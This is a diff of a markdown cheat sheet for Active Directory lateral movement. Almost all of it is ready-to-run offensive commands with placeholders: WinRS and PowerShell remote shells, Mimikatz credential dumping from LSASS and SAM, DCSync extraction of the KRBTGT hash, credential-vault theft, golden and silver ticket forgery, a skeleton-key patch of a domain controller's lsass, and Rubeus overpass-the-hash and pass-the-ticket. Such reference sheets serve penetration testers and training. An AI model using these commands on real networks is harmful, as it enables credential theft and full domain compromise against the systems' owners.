@@ -1,39 +1,42 @@
-## AL Lateral Movement
+## AD Lateral Movement
 
 - [PowerShell Remoting](#powershell-remoting)
-    + [Enable PowerShell Remoting](#enable-powershell-remoting)
-    + [Create Remote Session](#create-remote-session)
-    + [Entering into Existing PSSession](#entering-into-existing-pssession)
-    + [Remote Execution](#remote-execution)
+  * [Enable PowerShell Remoting](#enable-powershell-remoting)
+  * [Create Remote Session](#create-remote-session)
+  * [Entering into Existing PSSession](#entering-into-existing-pssession)
+  * [Remote Execution](#remote-execution)
 - [WinRS](#winrs)
-    + [Execute Remote Command](#execute-remote-command)
+  * [Execute Remote Command](#execute-remote-command)
 - [MimiKatz PowerShell Port](#mimikatz-powershell-port)
-    + [Dump Credentials on Local Machine](#dump-credentials-on-local-machine)
-    + [OverPass the Hash](#overpass-the-hash)
-    + [Get KRBTGT Hash](#get-krbtgt-hash)
-    + [Credentials from Credential Vault](#credentials-from-credential-vault)
-    + [Patch a DC `lsass` process** allowing to use any user with single password. DA privileges are required.](#patch-a-dc--lsass--process---allowing-to-use-any-user-with-single-password-da-privileges-are-required)
-    + [Golden Ticket](#golden-ticket)
-    + [Silver Ticket](#silver-ticket)
-    + [Skeleton Key Attack](#skeleton-key-attack)
+  * [Dump Credentials on Local Machine](#dump-credentials-on-local-machine)
+  * [Extract credentials from SAM](#extract-credentials-from-sam)
+  * [OverPass the Hash](#overpass-the-hash)
+  * [Get KRBTGT Hash](#get-krbtgt-hash)
+  * [Credential Vault](#credential-vault)
+  * [Golden Ticket](#golden-ticket)
+  * [Silver Ticket](#silver-ticket)
+  * [Skeleton Key Attack](#skeleton-key-attack)
+  * [Export Tickets](#export-tickets)
+  * [Pass The Ticket](#pass-the-ticket)
 - [Rubeus](#rubeus)
-    + [OverPass The Hash](#overpass-the-hash)
+  * [OverPass The Hash](#overpass-the-hash)
+  * [Pass the Ticket](#pass-the-ticket)
 
 
 ### PowerShell Remoting
 ---
-Uses TCP-5985. T
+> tcp/5985
 ```powershell
 # Check computers where PS Remoting can be used
 C:> . .\Find-PSRemotingLocalAdminAccess.ps1
 C:> Find-PSRemotingLocalAdminAccess
 ```
 
-##### Enable PowerShell Remoting  
+#### Enable PowerShell Remoting  
 ```powershell
 C:> Enable-PSRemoting 
 ```
-##### Create Remote Session 
+#### Create Remote Session 
 ```powershell
 # Create a Session in Local Computer
 C:> New-PSSession
@@ -44,7 +47,7 @@ C:> $remote_computer = New-PSSesion -ComputerName <computer>
 # Create Session on Multiple Computers
 C:> $s1, $s2, $s3 = New-PSSession -ComputerName Server01,Server02,Server03
 ```
-##### Entering into Existing PSSession
+#### Entering into Existing PSSession
 ```powershell
 # A Completelly New Session to Computer
 C:> Enter-PSSession -ComputerName <computer>
@@ -53,7 +56,7 @@ C:> Enter-PSSession -ComputerName <computer>
 C:> $remote_computer = New-PSSesion -ComputerName <computer>
 C:> Enter-PSSession -Session $remote_computer
 ```
-##### Remote Execution
+#### Remote Execution
 ```powershell
 # Remote Execution With Credentials
 c:> $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
@@ -86,7 +89,7 @@ C:> . .\Find-PSRemotingLocalAdminAccess.ps1
 C:> Find-PSRemotingLocalAdminAccess
 ```
 Uses same port as PSRemoting, and evades Remoting Logging.
-##### Execute Remote Command
+#### Execute Remote Command
 ```powershell
 # Use `cmd`as command to get a shell
 C:> winrs -remote:<computer> -u:<domain>\<user> -p:<password> <command>
@@ -98,20 +101,20 @@ Requires Local Admin Privileges on computer where is run.
 ```powershell
 C:> . .\Invoke-Mimikatz.ps1
 ```
-##### Dump Credentials on Local Machine
+#### Dump Credentials on Local Machine
 ```powershell
 C:> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 ```
-##### Extract credentials from SAM
+#### Extract credentials from SAM
 ```powershell
 C:> Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 ```
-##### OverPass the Hash
+#### OverPass the Hash
 ```powershell
 # Starts Powershell with logon type 9
 C:> Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<fqdn_domain> /aes256:<user_aes256key> /run:cmd.exe"'
 ```
-##### Get KRBTGT Hash
+#### Get KRBTGT Hash
 ```powershell
 # Run on DC, Domain Admin privileges required
 C:> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <dc-hostname>
@@ -121,27 +124,23 @@ C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
 # DCsync for another domain
 C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt /domain:<fqdn_domain>" "exit"'
 ```
-##### Credentials from Credential Vault
+#### Credential Vault
 ```powershell
 # Interesting Credentials are stored here, like credentials for scheduled tasks
 C:> Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 ```
-##### Patch a DC `lsass` process** allowing to use any user with single password. DA privileges are required.
-```powershell
-C:> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <hostname_full_FQDN>
-```
-##### Golden Ticket
+#### Golden Ticket
 ```powershell
 C:> Invoke-Mimikatz -Command '"kerberos::golden /User:<username> /domain:<domain_fqdn> /sid:<domain_sid> 
     /aes256:<krbtgt_aes_key> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"'
     
 # For Administrator User
 C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain_fqdn> /sid:<domain_sid> 
-    /aes256:krbtgt_aes_key> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+    /aes256:<krbtgt_aes_key> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
-##### Silver Ticket
+#### Silver Ticket
 ```powershell
-# Get Privileges to access HOST service as Administrator con host
+# Get Privileges to access HOST service as Administrator on host
 C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain_fqdn> /sid:<domain_sid> /target:<host_fqdn> 
     /service:HOST /rc4:<host_ntlm_hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"'
     
@@ -151,24 +150,30 @@ C:> Invoke-Mimikatz -Command '0"kerberos::golden /User:Administrator /domain:<do
     
 # With this two tickets, can execute WMI commands on host
 ```
-##### Skeleton Key Attack
+#### Skeleton Key Attack
 ```powershell
 # To run on DC. Allows init session with password mimikatz
-C:> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
+C:> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <hostname>
+
+# Patches lsass to allow login to any username using 'mimikatz' as passwd
 ```
-##### Export Tickets
+#### Export Tickets
 ```powershell
 C:> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"' 
 ```
+#### Pass The Ticket
+```powershell
+C:> Invoke-Mimikatz -Command "kerberos::ptt <KirbiFile>"
+```
 ### Rubeus
 ---
-##### OverPass The Hash
+#### OverPass The Hash
 ```powershell
 C:> Rubeus.exe asktgt /user:<username> /aes256:<aes256_key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 C:> Rubeus.exe asktgt /user:<username> /ntlm:<ntlm_rc4_key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 
 ```
-##### Pass the Ticket
+#### Pass the Ticket
 ```powershell
 C:> Rubeus.exe ptt /ticket:<base64_TGT>
 ```
